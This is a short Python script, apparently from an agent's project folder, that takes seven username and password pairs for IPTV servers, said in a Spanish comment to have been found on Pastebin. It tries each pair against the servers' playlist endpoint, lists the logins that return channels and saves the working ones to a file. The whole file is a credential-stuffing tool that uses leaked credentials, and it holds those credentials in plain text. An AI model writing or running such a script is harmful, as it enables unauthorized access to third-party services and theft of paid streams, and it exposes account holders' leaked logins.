import requests
import json

# Credenciales encontradas en Pastebin
credentials = [
    {"server": "iptvpro.premium-itv.com:8789", "user": "Aaron", "pass": "12345"},
    {"server": "163.172.52.182:8789", "user": "OKpoFQ12f", "pass": "6DadkpF6dfk"},
    {"server": "194.88.107.101:6204", "user": "marwan", "pass": "marwan"},
    {"server": "m-iptv.net:6204", "user": "denvanp", "pass": "den42749np"},
    {"server": "platinumpro-evo.co.uk:8080", "user": "wanaiptv", "pass": "wanaiptv"},
    {"server": "filex.me:8080", "user": "10101010", "pass": "10101010"},
    {"server": "filex.me:8080", "user": "112211", "pass": "112211"},
]

working = []

for cred in credentials:
    url = f"http://{cred['server']}/get.php?username={cred['user']}&password={cred['pass']}&type=m3u"
    try:
        print(f"[TESTING] {cred['user']}@{cred['server']}...")
        r = requests.get(url, timeout=10, stream=True)
        if "#EXTINF" in r.text or "#EXTM3U" in r.text:
            print(f"[+] WORKING! {cred['user']}@{cred['server']}")
            lines = r.text.count("#EXTINF")
            working.append({**cred, "channels": lines, "url": url})
        else:
            print(f"[-] Failed - No channels")
    except Exception as e:
        print(f"[!] Error: {str(e)[:30]}")

print(f"\n=== RESULTS ===")
print(f"Working: {len(working)}/{len(credentials)}")
for w in working:
    print(f"  {w['user']}:{w['pass']}@{w['server']} - {w['channels']} channels")

# Save working
with open("/home/z/my-project/download/working_creds.json", "w") as f:
    json.dump(working, f, indent=2)
print("\nSaved to working_creds.json")
